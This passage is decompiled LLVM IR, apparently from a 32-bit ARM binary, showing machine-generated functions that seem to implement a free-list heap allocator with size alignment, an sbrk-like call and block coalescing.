  %v2_f980 = sub i32 0, %v2_f96c
  %v3_f984 = and i32 %v2_f97c, %v2_f980
  store i32 %v3_f984, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_f968, %bb14
  store i32 ptrtoint (i32* @global_var_21d88.434 to i32), i32* %r0.global-to-local, align 4
  %v1_f990 = call i32 @function_10838()
  %v0_f994 = load i32, i32* @r4, align 4
  store i32 %v0_f994, i32* %r0.global-to-local, align 4
  %v1_f998 = call i32 @function_10f2c(i32 %v0_f994)
  store i32 %v1_f998, i32* %r0.global-to-local, align 4
  %v7_f99c = icmp eq i32 %v1_f998, -1
  br i1 %v7_f99c, label %bb15, label %dec_label_pc_f9a8

bb15:                                             ; preds = %.thread3
  store i32 %v1_f998, i32* @r5, align 4
  br label %dec_label_pc_f9bc

dec_label_pc_f9a8:                                ; preds = %.thread3
  %v1_f9a8 = add i32 %v1_f998, 3
  %v1_f9ac = and i32 %v1_f9a8, -4
  store i32 %v1_f9ac, i32* @r5, align 4
  %v9_f9b0 = icmp eq i32 %v1_f9ac, %v1_f998
  br i1 %v9_f9b0, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_f9a8
  %v3_f9b4 = sub i32 %v1_f9ac, %v1_f998
  store i32 %v3_f9b4, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_f9a8, %bb16
  %v1_f9b8 = xor i1 %v9_f9b0, true
  call void @__pseudo_cond_branch(i1 %v1_f9b8, i32 ptrtoint (i32* @global_var_10f2c.435 to i32))
  br label %dec_label_pc_f9bc

dec_label_pc_f9bc:                                ; preds = %bb15, %bb17
  store i32 ptrtoint (i32* @global_var_21d88.434 to i32), i32* %r0.global-to-local, align 4
  store i32 63948, i32* @lr, align 4
  %v1_f9c8 = call i32 @function_10838()
  store i32 %v1_f9c8, i32* %r0.global-to-local, align 4
  %v0_f9cc = load i32, i32* @r5, align 4
  %v7_f9cc = icmp eq i32 %v0_f9cc, -1
  br i1 %v7_f9cc, label %dec_label_pc_fa28, label %dec_label_pc_f9d4

dec_label_pc_f9d4:                                ; preds = %dec_label_pc_f9bc
  store i32 ptrtoint (i32* @global_var_21b08.425 to i32), i32* %r0.global-to-local, align 4
  %v1_f9e0 = call i32 @function_10838()
  %v0_f9e4 = load i32, i32* @r4, align 4
  %v0_f9e8 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_1f2ac.429 to i32), i32* %r0.global-to-local, align 4
  %sext = mul i32 %v0_f9e8, 16777216
  %v2_f9f0 = sdiv i32 %sext, 16777216
  %v5_f9f0 = call i32 @function_fc14(i32* bitcast (i32** @global_var_1f2ac.429 to i32*), i32 %v2_f9f0, i32 %v0_f9e4)
  store i32 ptrtoint (i32** @global_var_1f2ac.429 to i32), i32* %r0.global-to-local, align 4
  %v3_f9fc = call i32 @function_fb4c(i32* bitcast (i32** @global_var_1f2ac.429 to i32*), i32 %v2_f910)
  store i32 %v3_f9fc, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21b08.425 to i32), i32* %r0.global-to-local, align 4
  store i32 64016, i32* @lr, align 4
  %v1_fa0c = call i32 @function_10838()
  store i32 %v1_fa0c, i32* %r0.global-to-local, align 4
  %v2_fa10 = icmp eq i32 %v3_f9fc, 0
  br i1 %v2_fa10, label %dec_label_pc_fa28, label %dec_label_pc_fa18

dec_label_pc_fa18:                                ; preds = %dec_label_pc_f924, %dec_label_pc_f9d4
  %v1_fa1c = phi i32 [ %v3_f948, %dec_label_pc_f924 ], [ %v3_f9fc, %dec_label_pc_f9d4 ]
  %v2_fa18 = load i32, i32* %stack_var_-20, align 4
  %v2_fa1c = inttoptr i32 %v1_fa1c to i32*
  store i32 %v2_fa18, i32* %v2_fa1c, align 4
  %v3_fa1c = load i32, i32* %r4.global-to-local, align 4
  %v4_fa1c = add i32 %v3_fa1c, 4
  store i32 %v4_fa1c, i32* %r4.global-to-local, align 4
  %v2_fa20 = icmp eq i32 %v4_fa1c, 0
  br i1 %v2_fa20, label %dec_label_pc_fa28, label %dec_label_pc_fa38

dec_label_pc_fa28:                                ; preds = %dec_label_pc_fa18, %dec_label_pc_f9d4, %dec_label_pc_f9bc, %dec_label_pc_f91c
  %v0_fa28 = call i32 @function_cc08()
  store i32 %v0_fa28, i32* %r0.global-to-local, align 4
  %v2_fa30 = inttoptr i32 %v0_fa28 to i32*
  store i32 12, i32* %v2_fa30, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fa38

dec_label_pc_fa38:                                ; preds = %dec_label_pc_fa18, %dec_label_pc_fa28
  %v0_fa38 = phi i32 [ %v4_fa1c, %dec_label_pc_fa18 ], [ 0, %dec_label_pc_fa28 ]
  store i32 %v0_fa38, i32* %r0.global-to-local, align 4
  store i32 %v3_f908, i32* @r4, align 4
  store i32 %v6_f908, i32* @r5, align 4
  store i32 %v9_f908, i32* @r6, align 4
  ret i32 %v0_fa38

; uselistorder directives
  uselistorder i32 %v0_fa38, { 1, 0 }
  uselistorder i32 %v3_f9fc, { 1, 0, 2 }
  uselistorder i32 %v1_f9ac, { 1, 0, 2 }
  uselistorder i32 %v1_f998, { 4, 0, 3, 2, 1, 5 }
  uselistorder i32 %v3_f948, { 1, 0, 2 }
  uselistorder i32 %v0_f90c, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 6, 8, 3, 7, 9, 10, 11, 2, 13, 12, 5, 15, 14, 4, 16, 17, 18, 19, 0, 1 }
  uselistorder label %dec_label_pc_fa38, { 1, 0 }
  uselistorder label %dec_label_pc_fa18, { 1, 0 }
  uselistorder label %dec_label_pc_f9bc, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_f924, { 1, 0 }
}

define i32 @function_fa5c(i32 %arg1) local_unnamed_addr {
dec_label_pc_fa5c:
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_fa5c = icmp eq i32 %arg1, 0
  %v3_fa60 = load i32, i32* @r4, align 4
  store i32 %v3_fa60, i32* %stack_var_-24, align 4
  %v6_fa60 = load i32, i32* @r5, align 4
  %v9_fa60 = load i32, i32* @r6, align 4
  %v15_fa60 = load i32, i32* @r8, align 4
  br i1 %v2_fa5c, label %bb, label %bb11

bb:                                               ; preds = %dec_label_pc_fa5c
  ret i32 0

bb11:                                             ; preds = %dec_label_pc_fa5c
  %v1_fa68 = add i32 %arg1, -4
  %v2_fa68 = inttoptr i32 %v1_fa68 to i32*
  %v3_fa68 = load i32, i32* %v2_fa68, align 4
  store i32 %v3_fa68, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_1f2ac.429 to i32), i32* %r8.global-to-local, align 4
  store i32 %v1_fa68, i32* @r4, align 4
  %v1_fa80 = call i32 @function_10838()
  %v0_fa84 = load i32, i32* @r4, align 4
  %v0_fa88 = load i32, i32* @r5, align 4
  %v4_fa90 = call i32 @function_fc14(i32* bitcast (i32** @global_var_1f2ac.429 to i32*), i32 %v0_fa84, i32 %v0_fa88)
  %v1_fa98 = inttoptr i32 %v4_fa90 to i32*
  %v2_fa98 = load i32, i32* %v1_fa98, align 4
  store i32 %v2_fa98, i32* %r6.global-to-local, align 4
  %v2_fa9c = load i32, i32* @global_var_21b30.432, align 4
  %v4_faa0 = mul i32 %v2_fa9c, 8
  %v6_faa0 = icmp ult i32 %v2_fa98, %v4_faa0
  store i32 %v4_fa90, i32* @r4, align 4
  br i1 %v6_faa0, label %dec_label_pc_fae0, label %dec_label_pc_faac

dec_label_pc_faac:                                ; preds = %bb11
  %v1_fab4 = call i32 @function_10838()
  %v1_fabc = call i32 @function_10f2c(i32 0)
  %v0_fac0 = load i32, i32* @r4, align 4
  %v1_fac0 = add i32 %v0_fac0, 12
  store i32 %v1_fac0, i32* @r5, align 4
  %v9_fac4 = icmp eq i32 %v1_fac0, %v1_fabc
  br i1 %v9_fac4, label %dec_label_pc_fae8, label %dec_label_pc_facc

dec_label_pc_facc:                                ; preds = %dec_label_pc_faac
  %v1_fad8 = call i32 @function_10838()
  br label %dec_label_pc_fae0

dec_label_pc_fae0:                                ; preds = %bb11, %dec_label_pc_facc, %bb14
  %v2_fae0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_fae0, i32* @r4, align 4
  store i32 %v6_fa60, i32* @r5, align 4
  store i32 %v9_fa60, i32* %r6.global-to-local, align 4
  store i32 %v15_fa60, i32* %r8.global-to-local, align 4
  %v0_fae4 = call i32 @function_10838()
  %v0_fae8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_fae8

dec_label_pc_fae8:                                ; preds = %dec_label_pc_faac, %dec_label_pc_fae0
  %v1_faf0 = phi i32 [ %v0_fac0, %dec_label_pc_faac ], [ %v0_fae8.pre, %dec_label_pc_fae0 ]
  %v1_fae8 = add i32 %v1_faf0, 4
  %v2_fae8 = inttoptr i32 %v1_fae8 to i32*
  %v3_fae8 = load i32, i32* %v2_fae8, align 4
  %v2_faec = icmp eq i32 %v3_fae8, 0
  br i1 %v2_faec, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_fae8
  %v2_faf0 = add i32 %v1_faf0, 8
  %v3_faf0 = inttoptr i32 %v2_faf0 to i32*
  %v4_faf0 = load i32, i32* %v3_faf0, align 4
  %v3_faf4 = add i32 %v3_fae8, 8
  %v4_faf4 = inttoptr i32 %v3_faf4 to i32*
  store i32 %v4_faf0, i32* %v4_faf4, align 4
  %v0_faf8.pre = load i32, i32* @r4, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_fae8, %bb12
  %v0_faf8 = phi i32 [ %v1_faf0, %dec_label_pc_fae8 ], [ %v0_faf8.pre, %bb12 ]
  %v1_faf8 = add i32 %v0_faf8, 8
  %v2_faf8 = inttoptr i32 %v1_faf8 to i32*
  %v3_faf8 = load i32, i32* %v2_faf8, align 4
  %v1_fafc = add i32 %v0_faf8, 4
  %v2_fafc = inttoptr i32 %v1_fafc to i32*
  %v3_fafc = load i32, i32* %v2_fafc, align 4
  %v2_fb00 = icmp eq i32 %v3_faf8, 0
  br i1 %v2_fb00, label %.thread1, label %bb13

bb13:                                             ; preds = %.thread
  %v3_fb04 = add i32 %v3_faf8, 4
  %v4_fb04 = inttoptr i32 %v3_fb04 to i32*
  store i32 %v3_fafc, i32* %v4_fb04, align 4
  br label %bb14

.thread1:                                         ; preds = %.thread
  %v2_fb08 = load i32, i32* %r8.global-to-local, align 4
  %v3_fb08 = inttoptr i32 %v2_fb08 to i32*
  store i32 %v3_fafc, i32* %v3_fb08, align 4
  br label %bb14

bb14:                                             ; preds = %bb13, %.thread1
  %v1_fb18 = call i32 @function_10838()
  %v0_fb1c = load i32, i32* %r6.global-to-local, align 4
  %v1_fb1c = load i32, i32* @r4, align 4
  %v0_fb24 = load i32, i32* @r5, align 4
  %v2_fb1c = sub i32 12, %v0_fb1c
  %v1_fb20 = add i32 %v2_fb1c, %v1_fb1c
  %v2_fb24 = sub i32 %v1_fb20, %v0_fb24
  %v1_fb28 = call i32 @function_10f2c(i32 %v2_fb24)
  br label %dec_label_pc_fae0

; uselistorder directives
  uselistorder i32 %v0_faf8, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_10f2c, { 2, 1, 0 }
  uselistorder i32** @global_var_1f2ac.429, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_fae8, { 1, 0 }
  uselistorder label %dec_label_pc_fae0, { 2, 1, 0 }
}

define i32 @function_fb4c(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_fb4c:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v1_fb4c = inttoptr i32 %arg2 to i32*
  %v2_fb4c = load i32, i32* %v1_fb4c, align 4
  %v3_fb50 = load i32, i32* @r4, align 4
  store i32 %v3_fb50, i32* %stack_var_-8, align 4
  %v1_fb54 = add i32 %v2_fb4c, 3
  %v1_fb58 = and i32 %v1_fb54, -4
  store i32 %v1_fb58, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_fb60 = icmp ugt i32 %v1_fb58, 10
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_fb68 = load i32, i32* %arg1, align 4
  store i32 %v2_fb68, i32* %r0.global-to-local, align 4
  br i1 %v2_fb60, label %dec_label_pc_fbd4.preheader, label %bb

bb:                                               ; preds = %dec_label_pc_fb4c
  store i32 12, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fbd4.preheader

dec_label_pc_fbd4.preheader:                      ; preds = %dec_label_pc_fb4c, %bb
  %v1_fb88 = phi i32 [ %v1_fb58, %dec_label_pc_fb4c ], [ 12, %bb ]
  %v2_fbd49 = icmp eq i32 %v2_fb68, 0
  br i1 %v2_fbd49, label %dec_label_pc_fbdc, label %dec_label_pc_fb74

dec_label_pc_fb74:                                ; preds = %dec_label_pc_fbd4.preheader, %dec_label_pc_fbd0
  %v2_fb8c = phi i32 [ %v3_fbd0, %dec_label_pc_fbd0 ], [ %v2_fb68, %dec_label_pc_fbd4.preheader ]
  %v1_fb74 = inttoptr i32 %v2_fb8c to i32*
  %v2_fb74 = load i32, i32* %v1_fb74, align 4
  store i32 %v2_fb74, i32* @ip, align 4
  %v3_fb78 = icmp ult i32 %v2_fb74, %v1_fb88
  br i1 %v3_fb78, label %dec_label_pc_fbd0, label %dec_label_pc_fb80

dec_label_pc_fb80:                                ; preds = %dec_label_pc_fb74
  %v1_fb80 = add i32 %v1_fb88, 44
  %v3_fb84 = icmp ult i32 %v2_fb74, %v1_fb80
  br i1 %v3_fb84, label %dec_label_pc_fb94, label %.thread._crit_edge

.thread._crit_edge:                               ; preds = %dec_label_pc_fb80
  %v2_fb78.le = sub i32 %v2_fb74, %v1_fb88
  store i32 %v2_fb78.le, i32* %v1_fb74, align 4
  %v0_fbc0.pre = load i32, i32* @ip, align 4
  %v0_fbc8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb29

dec_label_pc_fb94:                                ; preds = %dec_label_pc_fb80
  %v1_fb94 = add i32 %v2_fb8c, 4
  %v2_fb94 = inttoptr i32 %v1_fb94 to i32*
  %v3_fb94 = load i32, i32* %v2_fb94, align 4
  store i32 %v3_fb94, i32* %r2.global-to-local, align 4
  %v2_fb98 = icmp eq i32 %v3_fb94, 0
  br i1 %v2_fb98, label %.thread2, label %bb27

bb27:                                             ; preds = %dec_label_pc_fb94
  %v2_fb9c = add i32 %v2_fb8c, 8
  %v3_fb9c = inttoptr i32 %v2_fb9c to i32*
  %v4_fb9c = load i32, i32* %v3_fb9c, align 4
  %v3_fba0 = add i32 %v3_fb94, 8
  %v4_fba0 = inttoptr i32 %v3_fba0 to i32*
  store i32 %v4_fb9c, i32* %v4_fba0, align 4
  %v0_fba4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_fb94, %bb27
  %v0_fba4 = phi i32 [ %v2_fb8c, %dec_label_pc_fb94 ], [ %v0_fba4.pre, %bb27 ]
  %v1_fba4 = add i32 %v0_fba4, 8
  %v2_fba4 = inttoptr i32 %v1_fba4 to i32*
  %v3_fba4 = load i32, i32* %v2_fba4, align 4
  %v1_fba8 = add i32 %v0_fba4, 4
  %v2_fba8 = inttoptr i32 %v1_fba8 to i32*
  %v3_fba8 = load i32, i32* %v2_fba8, align 4
  %v2_fbac = icmp eq i32 %v3_fba4, 0
  br i1 %v2_fbac, label %.thread5, label %bb28

bb28:                                             ; preds = %.thread2
  %v3_fbb0 = add i32 %v3_fba4, 4
  %v4_fbb0 = inttoptr i32 %v3_fbb0 to i32*
  store i32 %v3_fba8, i32* %v4_fbb0, align 4
  %v1_fbb8 = load i32, i32* @ip, align 4
  store i32 %v1_fbb8, i32* %r2.global-to-local, align 4
  br label %bb29

.thread5:                                         ; preds = %.thread2
  %v2_fbb4 = load i32, i32* %r1.global-to-local, align 4
  %v3_fbb4 = inttoptr i32 %v2_fbb4 to i32*
  store i32 %v3_fba8, i32* %v3_fbb4, align 4
  %v1_fbbc.pre = load i32, i32* @ip, align 4
  store i32 %v1_fbbc.pre, i32* %r2.global-to-local, align 4
  br label %bb29

bb29:                                             ; preds = %bb28, %.thread._crit_edge, %.thread5
  %v0_fbc8 = phi i32 [ %v0_fbc8.pre, %.thread._crit_edge ], [ %v1_fbb8, %bb28 ], [ %v1_fbbc.pre, %.thread5 ]
  %v0_fbc0 = phi i32 [ %v0_fbc0.pre, %.thread._crit_edge ], [ %v1_fbb8, %bb28 ], [ %v1_fbbc.pre, %.thread5 ]
  %v1_fbc0 = load i32, i32* %r0.global-to-local, align 4
  %v2_fbc0 = sub i32 %v1_fbc0, %v0_fbc0
  %v1_fbc4 = add i32 %v2_fbc0, 12
  store i32 %v1_fbc4, i32* %r0.global-to-local, align 4
  %v1_fbc8 = load i32, i32* %r4.global-to-local, align 4
  %v2_fbc8 = inttoptr i32 %v1_fbc8 to i32*
  store i32 %v0_fbc8, i32* %v2_fbc8, align 4
  %v2_fbcc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fbcc, i32* %r4.global-to-local, align 4
  ret i32 %v1_fbc4

dec_label_pc_fbd0:                                ; preds = %dec_label_pc_fb74
  %v1_fbd0 = add i32 %v2_fb8c, 4
  %v2_fbd0 = inttoptr i32 %v1_fbd0 to i32*
  %v3_fbd0 = load i32, i32* %v2_fbd0, align 4
  store i32 %v3_fbd0, i32* %r0.global-to-local, align 4
  %v2_fbd4 = icmp eq i32 %v3_fbd0, 0
  br i1 %v2_fbd4, label %dec_label_pc_fbd4.dec_label_pc_fbdc_crit_edge, label %dec_label_pc_fb74

dec_label_pc_fbd4.dec_label_pc_fbdc_crit_edge:    ; preds = %dec_label_pc_fbd0
  br label %dec_label_pc_fbdc

dec_label_pc_fbdc:                                ; preds = %dec_label_pc_fbd4.dec_label_pc_fbdc_crit_edge, %dec_label_pc_fbd4.preheader
  store i32 %v3_fb50, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_fbd0, { 1, 2, 0 }
  uselistorder i32 %v0_fba4, { 1, 0 }
  uselistorder i32 %v2_fb74, { 1, 0, 2, 3 }
  uselistorder i32 %v2_fb8c, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_fb88, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 0 }
  uselistorder label %bb29, { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_fb74, { 1, 0 }
  uselistorder label %dec_label_pc_fbd4.preheader, { 1, 0 }
}

define i32 @function_fbe0() local_unnamed_addr {
dec_label_pc_fbe0:
  %v0_fbe0 = load i32, i32* @r2, align 4
  %v2_fbe0 = icmp eq i32 %v0_fbe0, 0
  %v0_fbe4 = load i32, i32* @r3, align 4
  %v1_fbe4 = load i32, i32* @r1, align 4
  %v2_fbe4 = add i32 %v1_fbe4, 4
  %v3_fbe4 = inttoptr i32 %v2_fbe4 to i32*
  store i32 %v0_fbe4, i32* %v3_fbe4, align 4
  %v0_fbe8 = load i32, i32* @r2, align 4
  %v1_fbe8 = load i32, i32* @r1, align 4
  %v2_fbe8 = add i32 %v1_fbe8, 8
  %v3_fbe8 = inttoptr i32 %v2_fbe8 to i32*
  store i32 %v0_fbe8, i32* %v3_fbe8, align 4
  %v1_fbf0 = load i32, i32* @r1, align 4
  br i1 %v2_fbe0, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_fbe0
  %v2_fbec = load i32, i32* @r2, align 4
  %v3_fbec = add i32 %v2_fbec, 4
  %v4_fbec = inttoptr i32 %v3_fbec to i32*
  store i32 %v1_fbf0, i32* %v4_fbec, align 4
  br label %bb1

.thread:                                          ; preds = %dec_label_pc_fbe0
  %v2_fbf0 = load i32, i32* @r0, align 4
  %v3_fbf0 = inttoptr i32 %v2_fbf0 to i32*
  store i32 %v1_fbf0, i32* %v3_fbf0, align 4
  br label %bb1

bb1:                                              ; preds = %bb, %.thread
  %v0_fbf4 = load i32, i32* @r3, align 4
  %v2_fbf4 = icmp eq i32 %v0_fbf4, 0
  br i1 %v2_fbf4, label %bb3, label %bb2

bb2:                                              ; preds = %bb1
  %v1_fbf8 = load i32, i32* @r1, align 4
  %v3_fbf8 = add i32 %v0_fbf4, 8
  %v4_fbf8 = inttoptr i32 %v3_fbf8 to i32*
  store i32 %v1_fbf8, i32* %v4_fbf8, align 4
  br label %bb3

bb3:                                              ; preds = %bb1, %bb2
  %v1_fbfc = load i32, i32* @r0, align 4
  ret i32 %v1_fbfc

; uselistorder directives
  uselistorder i32 %v1_fbf0, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_fc00() local_unnamed_addr {
dec_label_pc_fc00:
  %v0_fc00 = load i32, i32* @r2, align 4
  %v2_fc00 = icmp eq i32 %v0_fc00, 0
  %v1_fc04 = load i32, i32* @r1, align 4
  br i1 %v2_fc00, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_fc00
  %v2_fc04 = load i32, i32* @r0, align 4
  %v3_fc04 = inttoptr i32 %v2_fc04 to i32*
  store i32 %v1_fc04, i32* %v3_fc04, align 4
  br label %bb2

.thread:                                          ; preds = %dec_label_pc_fc00
  %v3_fc08 = add i32 %v0_fc00, 4
  %v4_fc08 = inttoptr i32 %v3_fc08 to i32*
  store i32 %v1_fc04, i32* %v4_fc08, align 4
  br label %bb2

bb2:                                              ; preds = %bb, %.thread
  %v0_fc0c = load i32, i32* @r2, align 4
  %v1_fc0c = load i32, i32* @r1, align 4
  %v2_fc0c = add i32 %v1_fc0c, 8
  %v3_fc0c = inttoptr i32 %v2_fc0c to i32*
  store i32 %v0_fc0c, i32* %v3_fc0c, align 4
  %v1_fc10 = load i32, i32* @r0, align 4
  ret i32 %v1_fc10

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_fc14(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_fc14:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_fc14 = load i32, i32* @r4, align 4
  store i32 %v3_fc14, i32* %stack_var_-20, align 4
  %v2_fc18 = load i32, i32* %arg1, align 4
  store i32 %v2_fc18, i32* %r4.global-to-local, align 4
  %v2_fc1c = add i32 %arg3, %arg2
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_fc382 = icmp eq i32 %v2_fc18, 0
  br i1 %v2_fc382, label %dec_label_pc_fce8, label %dec_label_pc_fc28

dec_label_pc_fc28:                                ; preds = %dec_label_pc_fc14, %dec_label_pc_fc30
  %v0_fc78 = phi i32 [ %v0_fc80, %dec_label_pc_fc30 ], [ 0, %dec_label_pc_fc14 ]
  %v0_fc80 = phi i32 [ %v3_fc34, %dec_label_pc_fc30 ], [ %v2_fc18, %dec_label_pc_fc14 ]
  %v1_fc3c5.in = phi i32 [ %v3_fc34, %dec_label_pc_fc30 ], [ %v2_fc18, %dec_label_pc_fc14 ]
  %v1_fc3c5 = add i32 %v1_fc3c5.in, 12
  %v3_fc28 = icmp ult i32 %v1_fc3c5, %arg2
  br i1 %v3_fc28, label %dec_label_pc_fc30, label %dec_label_pc_fc48

dec_label_pc_fc30:                                ; preds = %dec_label_pc_fc28
  store i32 %v0_fc80, i32* %r6.global-to-local, align 4
  %v1_fc34 = add i32 %v0_fc80, 4
  %v2_fc34 = inttoptr i32 %v1_fc34 to i32*
  %v3_fc34 = load i32, i32* %v2_fc34, align 4
  store i32 %v3_fc34, i32* %r4.global-to-local, align 4
  %v2_fc38 = icmp eq i32 %v3_fc34, 0
  br i1 %v2_fc38, label %dec_label_pc_fc38.dec_label_pc_fce8.loopexit_crit_edge, label %dec_label_pc_fc28

dec_label_pc_fc48:                                ; preds = %dec_label_pc_fc28
  %v1_fc48 = inttoptr i32 %v0_fc80 to i32*
  %v2_fc48 = load i32, i32* %v1_fc48, align 4
  store i32 %v2_fc48, i32* @ip, align 4
  %v2_fc4c = sub i32 %v0_fc80, %v2_fc48
  %v1_fc50 = add i32 %v2_fc4c, 12
  %v3_fc54 = icmp uge i32 %v1_fc50, %v2_fc1c
  %v9_fc54 = icmp eq i32 %v1_fc50, %v2_fc1c
  %v2_fc58 = xor i1 %v9_fc54, true
  %v3_fc58 = and i1 %v3_fc54, %v2_fc58
  br i1 %v3_fc58, label %dec_label_pc_fce8, label %dec_label_pc_fc5c

dec_label_pc_fc5c:                                ; preds = %dec_label_pc_fc48
  %v2_fc5c = add i32 %v2_fc48, %arg3
  store i32 %v2_fc5c, i32* %r7.global-to-local, align 4
  br i1 %v9_fc54, label %dec_label_pc_fc64, label %dec_label_pc_fc90

dec_label_pc_fc64:                                ; preds = %dec_label_pc_fc5c
  %v2_fc64 = icmp eq i32 %v0_fc78, 0
  br i1 %v2_fc64, label %dec_label_pc_fcdc, label %dec_label_pc_fc6c

dec_label_pc_fc6c:                                ; preds = %dec_label_pc_fc64
  %v1_fc6c = add i32 %v0_fc78, 12
  %v9_fc70 = icmp eq i32 %v1_fc6c, %arg2
  br i1 %v9_fc70, label %dec_label_pc_fc78, label %dec_label_pc_fcdc

dec_label_pc_fc78:                                ; preds = %dec_label_pc_fc6c
  %v1_fc78 = inttoptr i32 %v0_fc78 to i32*
  %v2_fc78 = load i32, i32* %v1_fc78, align 4
  %v1_fc7c = add i32 %v0_fc78, 8
  %v2_fc7c = inttoptr i32 %v1_fc7c to i32*
  %v3_fc7c = load i32, i32* %v2_fc7c, align 4
  store i32 %v3_fc7c, i32* @r2, align 4
  store i32 %v0_fc80, i32* @r1, align 4
  %v2_fc84 = add i32 %v2_fc78, %v2_fc5c
  store i32 %v2_fc84, i32* %r7.global-to-local, align 4
  %v0_fc88 = call i32 @function_fc00()
  br label %dec_label_pc_fcdc

dec_label_pc_fc90:                                ; preds = %dec_label_pc_fc5c
  %v1_fc90 = add i32 %v0_fc80, 4
  %v2_fc90 = inttoptr i32 %v1_fc90 to i32*
  %v3_fc90 = load i32, i32* %v2_fc90, align 4
  store i32 %v3_fc90, i32* %r5.global-to-local, align 4
  %v2_fc94 = icmp eq i32 %v3_fc90, 0
  br i1 %v2_fc94, label %dec_label_pc_fcc8, label %dec_label_pc_fc9c

dec_label_pc_fc9c:                                ; preds = %dec_label_pc_fc90
  %v1_fc9c = inttoptr i32 %v3_fc90 to i32*
  %v2_fc9c = load i32, i32* %v1_fc9c, align 4
  store i32 %v2_fc9c, i32* @ip, align 4
  %v2_fca0 = sub i32 %v3_fc90, %v2_fc9c
  %v1_fca4 = add i32 %v2_fca0, 12
  %v9_fca8 = icmp eq i32 %v2_fc1c, %v1_fca4
  br i1 %v9_fca8, label %dec_label_pc_fcb0, label %dec_label_pc_fcc8

dec_label_pc_fcb0:                                ; preds = %dec_label_pc_fc9c
  store i32 %v0_fc78, i32* @r2, align 4
  store i32 %v3_fc90, i32* @r1, align 4
  %v2_fcb8 = add i32 %v2_fc9c, %v2_fc5c
  store i32 %v2_fcb8, i32* %r7.global-to-local, align 4
  %v0_fcbc = call i32 @function_fc00()
  %v0_fcc0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_fcc0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fcdc

dec_label_pc_fcc8:                                ; preds = %dec_label_pc_fc9c, %dec_label_pc_fc90
  %v2_fcc8 = add i32 %v0_fc80, %arg3
  store i32 %v2_fcc8, i32* %r4.global-to-local, align 4
  store i32 %v3_fc90, i32* @r3, align 4
  store i32 %v0_fc78, i32* @r2, align 4
  store i32 %v2_fcc8, i32* @r1, align 4
  %v0_fcd8 = call i32 @function_fbe0()
  br label %dec_label_pc_fcdc

dec_label_pc_fcdc:                                ; preds = %dec_label_pc_fc6c, %dec_label_pc_fc64, %dec_label_pc_fcb0, %dec_label_pc_fc78, %dec_label_pc_fcc8
  %v0_fcdc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_fcdc, i32* %r5.global-to-local, align 4
  %v0_fce0 = load i32, i32* %r7.global-to-local, align 4
  %v2_fce0 = inttoptr i32 %v0_fcdc to i32*
  store i32 %v0_fce0, i32* %v2_fce0, align 4
  br label %dec_label_pc_fd00

dec_label_pc_fc38.dec_label_pc_fce8.loopexit_crit_edge: ; preds = %dec_label_pc_fc30
  br label %dec_label_pc_fce8

dec_label_pc_fce8:                                ; preds = %dec_label_pc_fc14, %dec_label_pc_fc38.dec_label_pc_fce8.loopexit_crit_edge, %dec_label_pc_fc48
  %v1_fce8 = add i32 %v2_fc1c, -12
